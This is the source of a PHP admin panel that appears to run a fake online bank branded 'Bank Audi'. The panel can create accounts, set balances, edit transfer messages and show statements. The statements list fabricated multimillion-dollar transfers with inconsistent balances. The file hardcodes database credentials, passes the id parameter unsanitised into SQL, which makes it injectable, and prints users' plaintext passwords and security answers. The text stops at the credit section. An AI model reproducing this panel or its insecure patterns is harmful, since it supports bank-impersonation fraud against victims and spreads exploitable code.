<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="robots" content="noindex,nofollow"><noscript>&lt;meta http-equiv="refresh" content="0;URL=https://www.Fbnkal.com/s/online/JavascriptDisabled.html"&gt;</noscript><link rel="shortcut icon" type="image/x-icon" href="../images/favicon.ico"><script type="text/javascript" src="../js/jquery.min.js"></script><script type="text/javascript" src="../js/jquery.timer.js"></script><link rel="stylesheet" type="text/css" href="../css/portal.css"><title>Bank Audi Admin</title><script type="text/javascript">var req="?request=",d=document;function eId(i){return d.getElementById(i)}function hform(v,a){a=req+a||"";eId("hpost").value=v;eId("hform").action=a;eId("hform").submit();}$(d).ready(function(){$(".lnkAcc").click(function(){var ac=$(this).closest("tr").find(".acc").text(),al=$(this).attr("alt");if(al.substr(0,2)=="d|"){if(confirm("You are about to irrevocably delete the account: "+ac+"\r\nAll statements and messages associated with this account will also be removed.\r\nIf you are sure to proceed, click 'Ok' otherwise cancel"))hform(al.substr(2),"list&del");}else hform(ac,al);});$(".lnkstm").click(function(){hform($(this).closest("tr").find(".hid").text(),$(this).attr("alt"))});$(".linkback").click(function(){history.go(-1)});});</script><script src="//code.tidio.co/mgnhouvgxohr01fxtyzdspbfthzjsdoi.js" async></script></head><body><div id="container"><div id="top-right"><a href="/?out" style="color:#FF6600">Log Off</a></div><div id="top-left"><ul><li>Welcome, Admin</li><li><a href="home.php?pw">Change Password</a></li></ul></div><div id="banner"><a id="logo"><span></span></a></div>


<?php
session_start();
if(!isset($_SESSION['admin']))
{header("location:/");}
	$con=mysqli_connect("localhost","itrakvqy_b","nze2903NZE2903", "itrakvqy_b")or die();

 if(isset($_GET['list'])){ ?>
<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style>
<h1>Account List</h1><form action="" method="post" id="hform"><input type="hidden" name="hpost" id="hpost" value=""></form><table class="tblist tbacclist"><tbody><tr><th style="width:5px"></th><th>Name</th><th colspan="2">Account number</th></tr>
<?php 
$tr = 1;
	$recd= mysqli_query($con, "select * from account ")or die(mysqli_error($con));
	
	while($rec = mysqli_fetch_array($recd)){ ?>
<tr><td><?php echo $tr; ?></td><td><b><?php echo $rec['name']; ?></b></td><td><a alt="view" href="home.php?details&&id=<?php echo $rec['id']; ?>"><?php echo $rec['accno']; ?></a></td><td><a alt="view" href="home.php?edit&&id=<?php echo $rec['id']; ?>">Edit</a> <a alt="view" href="home.php?credit&&id=<?php echo $rec['id']; ?>">Credit / Debit</a> <a alt="view" href="home.php?state&&id=<?php echo $rec['id']; ?>">Statement</a> <a alt="view" href="home.php?mail&&id=<?php echo $rec['id']; ?>">Messages</a> <a alt="view" href="home.php?delete&&id=<?php echo $rec['id']; ?>">Delete</a></td></tr>
		
<?php	++$tr;	}
?>
</tbody></table></div>
<?php } ?>


<?php
if(isset($_GET['pw'])){ ?>

<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style><h1>Change Admin Password</h1><form method="post" action=""><table class="tbdetail"><tbody><tr><td>Current Password</td><td><input type="password" name="apw"></td></tr><tr><td>New Password</td><td><input type="password" name="napw"></td></tr><tr><td>New Password Again</td><td><input type="password" name="napw2"></td></tr><tr><td></td><td><input type="submit" value="Submit"></td></tr></tbody></table></form></div>

<?php }
?>


<?php
if(isset($_GET['acc'])){ ?>
<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style><!--<span class="top-nav linkback">Back</span>--><form action="" method="post"><h1>Add New Account</h1><table><tbody><tr><td>Account Number</td><td><input type="text" name="accno" value="" maxlength="19"></td></tr><tr><td>Sort Code</td><td><input type="text" name="routing" value="" maxlength="20"></td></tr><tr><td>Account Type</td><td><input type="text" name="type" value="" maxlength="20"></td></tr><tr><td>Account Status</td><td><select name="status"><option value="Active">Active</option><option value="Inactive">Inactive</option><option value="Suspended">Suspended</option></select></td></tr><tr><td>Access Code</td><td><input type="text" name="accesscode" value="" maxlength="20"></td></tr><tr><td>Ref Code <span class="f9">(Optional)</span></td><td><input type="text" name="taxcode" value="" maxlength="20"></td></tr><tr><td>Tax Code <span class="f9">(Optional)</span></td><td><input type="text" name="refcode" value="" maxlength="20"></td></tr><tr><td>Account Currency</td><td><select name="currency"><option value=""></option><option value="£">£</option><option value="$">$</option><option value="€">€</option></select></td></tr><tr><td valign="top">Transfer Messager</td><td><textarea name="msg" style="height:80px; width:350px">Your transfer has been submitted for processing. Funds will be credited into beneficiary's account within 3 banking days.</textarea></td></tr><tr><td>&nbsp;</td><td><input type="submit" class="btngo" value="Submit"></td></tr></tbody></table></form></div><?php }
?>

<?php if(isset($_GET['state'])){ ?>

<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style><h1>Statement Center</h1><form action="" method="post" id="hform"><input type="hidden" name="hpost" id="hpost" value=""></form><table class="tblist"><tbody><tr><th>Date</th><th>Description</th><th>Credit</th><th>Debit</th><th>Balance</th><th>Status</th><th colspan="2">For</th></tr><tr><td style="width:65px">25/03/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">PROGRESS PAYMENT</a></td><td>$1,114,500.00</td><td></td><td>$1,114,500.00</td><td>Processed </td><td>Friedrich Muller</td><td><span class="hid">200</span></td></tr><tr><td style="width:65px">23/03/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$303,005.00</td><td>$2,724,685.00</td><td>Pending </td><td>Colombo Leonardo Moretti</td><td><span class="hid">199</span></td></tr><tr><td style="width:65px">18/03/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$55,000.00</td><td>$482,370.00</td><td>Processed </td><td>Susan Mark Ritter</td><td><span class="hid">198</span></td></tr><tr><td style="width:65px">19/02/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">COLOMBO MORETTI</a></td><td></td><td>$53,199,567.00</td><td>$537,370.00</td><td>Processed </td><td>Susan Mark Ritter</td><td><span class="hid">197</span></td></tr><tr><td style="width:65px">12/02/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td>$53,736,937.00</td><td></td><td>$53,736,937.00</td><td>Processed </td><td>Susan Mark Ritter</td><td><span class="hid">196</span></td></tr><tr><td style="width:65px">08/03/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$22,530.00</td><td>$3,027,690.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">195</span></td></tr><tr><td style="width:65px">03/03/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$1,212,020.00</td><td>$3,050,360.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">194</span></td></tr><tr><td style="width:65px">01/03/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$1,212,020.00</td><td>$3,050,220.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">193</span></td></tr><tr><td style="width:65px">24/02/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">MOSAIC OIL &amp; GAS</a></td><td>$2,500,000.00</td><td></td><td>$4,262,240.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">192</span></td></tr><tr><td style="width:65px">15/02/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">STARS AIRLINE</a></td><td></td><td>$15,340.00</td><td>$1,762,240.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">191</span></td></tr><tr><td style="width:65px">07/10/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">APA ENERGY</a></td><td>$610,450.00</td><td></td><td>$1,777,580.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">190</span></td></tr><tr><td style="width:65px">06/07/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$425,070.00</td><td>$1,167,130.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">189</span></td></tr><tr><td style="width:65px">12/04/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">CENTURY INC.</a></td><td>$526,500.00</td><td></td><td>$1,592,200.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">188</span></td></tr><tr><td style="width:65px">03/12/2018</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">ANNALY CAPITAL MANAGEMENT</a></td><td>$1,065,700.00</td><td></td><td>$1,065,700.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">187</span></td></tr><tr><td style="width:65px">24/02/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">MOSAIC OIL &amp; GAS</a></td><td>$2,500,000.00</td><td></td><td>$4,262,380.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">186</span></td></tr><tr><td style="width:65px">15/02/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">STARS AIRLINE</a></td><td></td><td>$15,200.00</td><td>$1,762,380.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">185</span></td></tr><tr><td style="width:65px">01/03/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">APA ENERGY</a></td><td>$610,450.00</td><td></td><td>$1,777,580.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">184</span></td></tr><tr><td style="width:65px">02/06/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$425,070.00</td><td>$1,167,130.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">183</span></td></tr><tr><td style="width:65px">14/05/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">ANNALY CAPITAL MANAGEMENT</a></td><td>$526,500.00</td><td></td><td>$1,592,200.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">182</span></td></tr><tr><td style="width:65px">03/12/2018</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">ANNALY CAPITAL MANAGEMENT</a></td><td>$1,065,700.00</td><td></td><td>$1,065,700.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">181</span></td></tr><tr><td style="width:65px">25/01/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$1,203,025.00</td><td>$2,144,185.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">180</span></td></tr><tr><td style="width:65px">14/01/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$86,000.00</td><td>$1,114,500.00</td><td>Pending </td><td>Fredrick Hoffman</td><td><span class="hid">179</span></td></tr><tr><td style="width:65px">06/01/2020</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">PROGRESS PAYMENT</a></td><td>$1,200,500.00</td><td></td><td>$1,200,500.00</td><td>Processed </td><td>Fredrick Hoffman</td><td><span class="hid">178</span></td></tr><tr><td style="width:65px">16/12/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$962,420.00</td><td>$3,347,210.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">177</span></td></tr><tr><td style="width:65px">16/12/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">CHEVRON</a></td><td>$1,600,000.00</td><td></td><td>$3,039,430.00</td><td>Processed </td><td>Lucio Dennic Rovere</td><td><span class="hid">176</span></td></tr><tr><td style="width:65px">12/05/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">APA ENERGY</a></td><td>$642,500.00</td><td></td><td>$1,439,430.00</td><td>Processed </td><td>Lucio Dennic Rovere</td><td><span class="hid">175</span></td></tr><tr><td style="width:65px">11/02/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$425,070.00</td><td>$796,930.00</td><td>Processed </td><td>Lucio Dennic Rovere</td><td><span class="hid">174</span></td></tr><tr><td style="width:65px">06/01/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">CENTURY INC.</a></td><td>$526,500.00</td><td></td><td>$1,222,000.00</td><td>Processed </td><td>Lucio Dennic Rovere</td><td><span class="hid">173</span></td></tr><tr><td style="width:65px">23/12/2018</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">ANNALY CAPITAL MANAGEMENT</a></td><td>$695,500.00</td><td></td><td>$695,500.00</td><td>Processed </td><td>Lucio Dennic Rovere</td><td><span class="hid">172</span></td></tr><tr><td style="width:65px">13/12/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">MOSAIC OIL &amp; GAS</a></td><td>$2,500,000.00</td><td></td><td>$4,309,630.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">171</span></td></tr><tr><td style="width:65px">12/05/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">APA ENERGY</a></td><td>$642,500.00</td><td></td><td>$1,809,630.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">170</span></td></tr><tr><td style="width:65px">11/02/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$425,070.00</td><td>$1,167,130.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">169</span></td></tr><tr><td style="width:65px">06/01/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">CENTURY INC.</a></td><td>$526,500.00</td><td></td><td>$1,592,200.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">168</span></td></tr><tr><td style="width:65px">23/12/2018</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">ANNALY CAPITAL MANAGEMENT</a></td><td>$1,065,700.00</td><td></td><td>$1,065,700.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">167</span></td></tr><tr><td style="width:65px">08/12/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$962,420.00</td><td>$3,347,210.00</td><td>Pending </td><td>Colombo Leonardo Moretti</td><td><span class="hid">166</span></td></tr><tr><td style="width:65px">04/12/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">MOSAIC OIL &amp; GAS</a></td><td>$2,500,000.00</td><td></td><td>$4,309,630.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">165</span></td></tr><tr><td style="width:65px">12/05/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">APA ENERGY</a></td><td>$642,500.00</td><td></td><td>$1,809,630.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">164</span></td></tr><tr><td style="width:65px">11/02/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$425,070.00</td><td>$1,167,130.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">163</span></td></tr><tr><td style="width:65px">06/01/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">CENTURY INC.</a></td><td>$526,500.00</td><td></td><td>$1,592,200.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">162</span></td></tr><tr><td style="width:65px">23/12/2018</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">ANNALY CAPITAL MANAGEMENT</a></td><td>$1,065,700.00</td><td></td><td>$1,065,700.00</td><td>Processed </td><td>Colombo Leonardo Moretti</td><td><span class="hid">161</span></td></tr><tr><td style="width:65px">20/11/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$1,203,025.00</td><td>$3,106,605.00</td><td>Pending </td><td>Nathan Hanzi</td><td><span class="hid">140</span></td></tr><tr><td style="width:65px">15/11/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">EXXON MOBIL</a></td><td>$2,500,000.00</td><td></td><td>$4,309,630.00</td><td>Processed </td><td>Nathan Hanzi</td><td><span class="hid">139</span></td></tr><tr><td style="width:65px">12/05/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">APA ENERGY</a></td><td>$642,500.00</td><td></td><td>$1,809,630.00</td><td>Processed </td><td>Nathan Hanzi</td><td><span class="hid">138</span></td></tr><tr><td style="width:65px">11/02/2019</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">INTERNATIONAL FX TRANSFER</a></td><td></td><td>$425,070.00</td><td>$1,167,130.00</td><td>Processed </td><td>Nathan Hanzi</td><td><span class="hid">137</span></td></tr><tr><td style="width:65px">16/10/2018</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">COLOMBO MORETTI</a></td><td>$526,500.00</td><td></td><td>$1,592,200.00</td><td>Processed </td><td>Nathan Hanzi</td><td><span class="hid">136</span></td></tr><tr><td style="width:65px">23/12/2017</td><td><a alt="statement&amp;view&amp;all" class="normal lnkstm">ANNALY CAPITAL MANAGEMENT</a></td><td>$1,065,700.00</td><td></td><td>$1,065,700.00</td><td>Processed </td><td>Nathan Hanzi</td><td><span class="hid">135</span></td></tr></tbody></table></div>

<?php } ?>

<?php if(isset($_GET['mail'])){ ?>
<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style><h1>Message Center</h1><div id="pageContentNav"><ul><li class="sel"><a href="?request=msg&amp;Inbox">Inbox</a></li><li class=""><a href="?request=msg&amp;Sent">Sent</a></li><li class=""><a href="?request=msg&amp;New">New Message</a></li></ul></div>No message in Inbox</div>

<?php } ?>

<?php if(isset($_GET['details']) && isset($_GET['id'])){ ?>
<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style>

<?php 
$tr = $_GET['id'];
	$recd= mysqli_query($con, "select * from account WHERE id='".$tr."' ")or die(mysqli_error($con));
	
	if($rec = mysqli_fetch_array($recd)){
		
		 ?>

<h1>Details of Account: <?php echo $rec['accno']; ?></h1><table class="tbaccdetail">
<tbody>
<tr><td>Account Number</td><td><?php echo $rec['accno']; ?></td></tr>
<tr><td>Acc type</td><td><?php echo $rec['acctype']; ?></td></tr>
<tr><td>balance</td><td><?php echo $rec['accbal']; ?></td></tr>
<tr><td>Account status</td><td><?php echo $rec['accstatus']; ?></td></tr>
<tr><td>Routing</td><td><?php echo $rec['routing']; ?></td></tr>
<tr><td>Last Login</td><td><?php echo $rec['lastlogin']; ?></td></tr>
<tr><td>Access code</td><td><?php echo $rec['accesscode']; ?></td></tr>
<tr><td>Tax Code</td><td><?php echo $rec['taxcode']; ?></td></tr>
<tr><td>Reflection code</td><td><?php echo $rec['refcode']; ?></td></tr>

<tr><td valign="top">Transfer Message</td><td><?php echo $rec['tfmsg']; ?>.</td></tr>
<tr><td>Question 1 </td><td><?php echo $rec['question1']; ?></td></tr>
<tr><td>Answer 1</td><td><?php echo $rec['answer1']; ?></td></tr>
<tr><td>Question 2 </td><td><?php echo $rec['question2']; ?></td></tr>
<tr><td>Answer 2</td><td><?php echo $rec['answer2']; ?></td></tr>
<tr><td>Question 3 </td><td><?php echo $rec['question3']; ?></td></tr>
<tr><td>Answer 3</td><td><?php echo $rec['answer3']; ?></td></tr>
<tr><td colspan="2"><h2>Account Holder Details</h2></td></tr>
<tr><td>Title</td><td><?php echo $rec['title']; ?></td></tr>
<tr><td>Name</td><td><?php echo $rec['name']; ?></td></tr>
<tr><td>Date of Birth</td><td><?php echo $rec['dob']; ?></td></tr>
<tr><td valign="top">Address</td><td><?php echo $rec['address']; ?></td></tr>
<tr><td>Postcode</td><td><?php echo $rec['postcode']; ?></td></tr>
<tr><td>Country</td><td><?php echo $rec['country']; ?></td></tr>
<tr><td>Email</td><td><?php echo $rec['email']; ?></td></tr>
<tr><td>Phone</td><td><?php echo $rec['phone']; ?></td></tr>
<tr><td>Username</td><td><?php echo $rec['username']; ?></td></tr>
<tr><td>Passowrd</td><td><?php echo $rec['password']; ?></td></tr>
</tbody></table></div>

<?php }} ?>


<?php if(isset($_GET['edit'])){ ?>

<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style><!--<span class="top-nav linkback">Back</span>--><form action="" method="post"><input type="hidden" name="hpost" value="20087182444"><input type="hidden" name="name" value=""><h1>Edit Account</h1><table><tbody><tr><td>Account Holder</td><td style="font-weight:bold"></td></tr><tr><td>Account Number</td><td><input type="text" name="accno" value="20087182444" maxlength="19"></td></tr><tr><td>Sort Code</td><td><input type="text" name="routing" value="238474" maxlength="20"></td></tr><tr><td>Account Type</td><td><input type="text" name="type" value="Checking" maxlength="20"></td></tr><tr><td>Account Status</td><td><select name="status"><option selected="" value="Active">Active</option><option value="Inactive">Inactive</option><option value="Suspended">Suspended</option></select></td></tr><tr><td>Access Code</td><td><input type="text" name="accesscode" value="2030" maxlength="20"></td></tr><tr><td>Ref Code <span class="f9">(Optional)</span></td><td><input type="text" name="taxcode" value="FA2190" maxlength="20"></td></tr><tr><td>Tax Code <span class="f9">(Optional)</span></td><td><input type="text" name="refcode" value="L18473" maxlength="20"></td></tr><tr><td>Account Currency</td><td><select name="currency"><option value=""></option><option value="£">£</option><option selected="" value="$">$</option><option value="€">€</option></select></td></tr><tr><td valign="top">Transfer Messager</td><td><textarea name="msg" style="height:80px; width:350px">Your transfer has been submitted for processing. Funds will be credited into beneficiary's account within 3 banking days.</textarea></td></tr><tr><td>&nbsp;</td><td><input type="submit" class="btngo" value="Submit"></td></tr></tbody></table></form></div>
<?php } ?>





<?php if(isset($_GET['credit'])){ ?>



